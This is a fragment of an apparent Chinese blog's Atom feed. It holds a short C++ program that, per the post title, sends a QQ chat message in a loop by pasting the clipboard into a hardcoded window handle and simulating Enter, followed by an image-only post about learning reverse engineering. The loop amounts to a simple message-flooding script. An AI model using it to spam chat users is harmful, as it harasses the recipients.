class="meta-keyword">include</span> <span class="meta-string">&lt;process.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> _<span class="function">stdcall <span class="title">ThreadOne</span><span class="params">(<span class="keyword">void</span>* Parg)</span>                   <span class="comment">//stdcall自动平衡堆栈</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">int</span> j;</span><br><span class="line"><span class="built_in">cin</span> &gt;&gt; j;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span> ; i &lt; j; i++)</span><br><span class="line">&#123;</span><br><span class="line">SendMessage((HWND)<span class="number">0x002401E8</span>, WM_PASTE, <span class="number">0</span>, <span class="number">0</span>);    <span class="comment">//获取窗口线程   获取剪切板内容</span></span><br><span class="line">        Sleep(<span class="number">300</span>);</span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);                  <span class="comment">//模拟按下回车</span></span><br><span class="line">keybd_event(VK_RETURN, <span class="number">0</span>, KEYEVENTF_KEYUP, <span class="number">0</span>);    <span class="comment">//模拟弹起回车</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">_beginthreadex(<span class="literal">NULL</span>,<span class="literal">NULL</span>,ThreadOne,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);        <span class="comment">//线程调用</span></span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="string">"输入发送次数"</span> &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>From <a href="https://kabeor.github.io/C++调用线程实现QQ消息循环发送/">https://kabeor.github.io/C++调用线程实现QQ消息循环发送/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;C-调用线程实现QQ消息循环发送&quot;&gt;&lt;a href=&quot;#C-调用线程实现QQ消息循环发送&quot; class=&quot;headerlink&quot; title=&quot;C++调用线程实现QQ消息循环发送&quot;&gt;&lt;/a&gt;C++调用线程实现QQ消息循环发送&lt;/h1&gt;&lt;p&gt;##函数原型&lt;br&gt;&lt;f
      
    
    </summary>
    
      <category term="Code" scheme="https://kabeor.github.io/categories/Code/"/>
    
    
      <category term="C++多线程" scheme="https://kabeor.github.io/tags/C-%E5%A4%9A%E7%BA%BF%E7%A8%8B/"/>
    
  </entry>
  
  <entry>
    <title>逆向的难点、如何进阶和逆向其他题型</title>
    <link href="https://kabeor.github.io/%E9%80%86%E5%90%91%E7%9A%84%E9%9A%BE%E7%82%B9%E3%80%81%E5%A6%82%E4%BD%95%E8%BF%9B%E9%98%B6%E5%92%8C%E9%80%86%E5%90%91%E5%85%B6%E4%BB%96%E9%A2%98%E5%9E%8B/"/>
    <id>https://kabeor.github.io/逆向的难点、如何进阶和逆向其他题型/</id>
    <published>2019-03-31T05:59:01.761Z</published>
    <updated>2018-07-14T10:50:37.872Z</updated>
    
    <content type="html"><![CDATA[<h1 id="逆向的难点、如何进阶和逆向其他题型"><a href="#逆向的难点、如何进阶和逆向其他题型" class="headerlink" title="逆向的难点、如何进阶和逆向其他题型"></a>逆向的难点、如何进阶和逆向其他题型</h1><p><img src="https://i.loli.net/2018/07/14/5b49d5799e7f8.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d579c3cb7.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d579ea235.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d57a18654.jpg" alt="mark"></p><p><img src="https://i.loli.net/2018/07/14/5b49d57a2dff1.jpg" alt="mark"></p><p>From <a href="https://kabeor.github.io/逆向的难点、如何进阶和逆向其他题型/">https://kabeor.github.io/逆向的难点、如何进阶和逆向其他题型/</a> bye</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;逆向的难点、如何进阶和逆向其他题型&quot;&gt;&lt;a href=&quot;#逆向的难点、如何进阶和逆向其他题型&quot; class=&quot;headerlink&quot; title=&quot;逆向的难点、如何进阶和逆向其他题型&quot;&gt;&lt;/a&gt;逆向的难点、如何进阶和逆向其他题型&lt;/h1&gt;&lt;p&gt;&lt;img src=&quot;
      
    
    </summary>
    
      <category term="逆向" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/categories/%E9%80%86%E5%90%91/i%E6%98%A5%E7%A7%8B/"/>
    
    
      <category term="逆向" scheme="https://kabeor.github.io/tags/%E9%80%86%E5%90%91/"/>
    
      <category term="i春秋" scheme="https://kabeor.github.io/tags/i%E6%98%A5%E7%A7%8B/"/>
    
  </entry>
  
</feed>
